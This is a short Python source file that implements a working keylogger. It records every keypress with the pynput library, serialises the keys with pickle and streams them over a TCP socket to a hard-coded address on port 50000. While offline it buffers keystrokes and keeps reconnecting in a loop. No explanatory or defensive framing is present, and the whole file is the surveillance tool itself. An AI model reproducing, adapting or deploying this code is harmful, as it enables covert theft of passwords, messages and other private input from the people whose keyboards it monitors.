from pynput.keyboard import Listener
import socket
from pickle import dumps
#from logging import basicConfig


class Global:
    key_array = []
    i = 0


class Socket:

    connection = False

    def __init__(self):
        self.connect_to_server()

    def connect_to_server(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect(("192.168.178.22", 50000))
            Socket.connection = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            Socket.connection = False
            print("No connection established!")

    def send_char(self, char):
        char = dumps(char)
        if Socket.connection:
            try:
                self.active_socket.send(char)
                return True
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                return False
        else:
            return False

    def send_array(self, array):
        if Socket.connection:
            array = dumps(array)
            try:
                self.active_socket.send(array)
                Socket.connection = True
                Global.key_array = []
            except(ConnectionResetError, ConnectionAbortedError, OSError):
                Socket.connection = False


def no_safe_key_press(key):
    key = str(key).replace("'", "")
    send = connection_established.send_char(key)
    if not send:
        Global.key_array.append(key)
        Socket.connection = False
        return False


def safe_key_press(key):
    key = str(key).replace("'", "")
    Global.key_array.append(key)
    Global.i += 1
    if Global.i == 20:
        Global.i = 0
        return False


connection_established = Socket()
while True:
    if not Socket.connection:
        connection_established.connect_to_server()

    if Socket.connection and not Global.key_array:
        with Listener(on_press=no_safe_key_press)as f:
            f.join()

    elif Socket.connection and Global.key_array:
        connection_established.send_array(Global.key_array)

    elif not Socket.connection:
        with Listener(on_press=safe_key_press)as f:
            f.join()
        Global.key_array.append("[Lost Objectives]")



